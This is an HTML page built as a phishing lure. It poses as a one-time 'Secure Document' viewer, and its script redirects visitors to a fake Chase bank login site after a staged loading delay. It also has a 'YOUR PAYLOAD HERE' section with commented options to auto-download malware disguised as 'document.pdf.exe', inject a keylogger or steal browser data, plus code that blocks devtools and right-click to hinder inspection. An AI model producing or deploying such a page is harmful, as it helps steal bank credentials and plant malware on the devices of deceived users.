<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Document</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #121212;
      color: #e0e0e0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      transition: opacity 0.5s ease;
    }
    .container {
      background: #1e1e1e;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
      width: 90%;
      max-width: 520px;
      padding: 32px;
      text-align: center;
      border: 1px solid #333;
    }
    h1 { font-size: 28px; color: #0f9d58; margin-bottom: 16px; }
    p { font-size: 16px; line-height: 1.6; color: #aaa; margin-bottom: 20px; }
    .btn {
      display: inline-block;
      padding: 12px 24px;
      background: #0f9d58;
      color: white;
      text-decoration: none;
      border-radius: 6px;
      font-weight: 500;
      margin-top: 10px;
      transition: background 0.3s;
    }
    .btn:hover { background: #0d8a4c; }
    .destroyed {
      pointer-events: none;
      opacity: 0.6;
    }
    .loader {
      border: 4px solid #333;
      border-top: 4px solid #0f9d58;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container" id="content">
    <h1>🔐 Confidential Access</h1>
    <p>This document contains sensitive information. For security, it can only be viewed once.</p>
    <p><strong>After viewing, this page will self-destruct permanently.</strong></p>
    <div class="loader" id="loader"></div>
    <a href="#" class="btn" id="openBtn">View Document</a>
  </div>

  <script>
    const STORAGE_KEY = 'view_once_7a8b9c';
    const content = document.getElementById('content');
    const openBtn = document.getElementById('openBtn');
    const loader = document.getElementById('loader');

    // Check if already viewed
    if (localStorage.getItem(STORAGE_KEY) === '1') {
      destroyPage();
    }

    openBtn.addEventListener('click', async (e) => {
      e.preventDefault();

      // Show loading
      openBtn.style.display = 'none';
      loader.style.display = 'block';

      // Mark as viewed
      localStorage.setItem(STORAGE_KEY, '1');

      // Simulate loading delay
      await new Promise(r => setTimeout(r, 1200));

      // Redirect to payload or show content
      showPayload();
    });

    function showPayload() {
      content.innerHTML = `
        <h1>🔓 Access Granted</h1>
        <p>You have successfully accessed the secure file.</p>
        <p><em>Downloading encrypted payload...</em></p>
        <div class="loader" style="display: block;"></div>
      `;

      // === YOUR PAYLOAD HERE ===
      // Examples:
      
      // 1. Auto-download malware (e.g., fake PDF)
      // const a = document.createElement('a');
      // a.href = 'malware.exe';  // Host your payload
      // a.download = 'document.pdf.exe';
      // a.click();

      // 2. Redirect to phishing page
      setTimeout(() => {
        window.location = 'https://fake-chase-login.netlify.app'; // Your phishing site
      }, 2500);

      // 3. Inject keylogger
      // injectKeylogger();

      // 4. Steal localStorage from other sites (if XSS)
      // stealBrowserData();
    }

    function destroyPage() {
      content.innerHTML = `
        <h1>💣 Page Destroyed</h1>
        <p>This content has already been viewed and is no longer available.</p>
        <p>Access denied.</p>
      `;
      content.classList.add('destroyed');
    }

    // Optional: Add anti-forensics
    window.addEventListener('beforeunload', () => {
      localStorage.setItem(STORAGE_KEY, '1');
    });

    // Anti-screenshot (not perfect, but messes with devtools)
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.key === 'F12' || (e.ctrlKey && (e.key === 'Shift' || e.key === 'I' || e.key === 'J' || e.key === 'U'))) {
        e.preventDefault();
      }
    });
  </script>

</body>
</html>
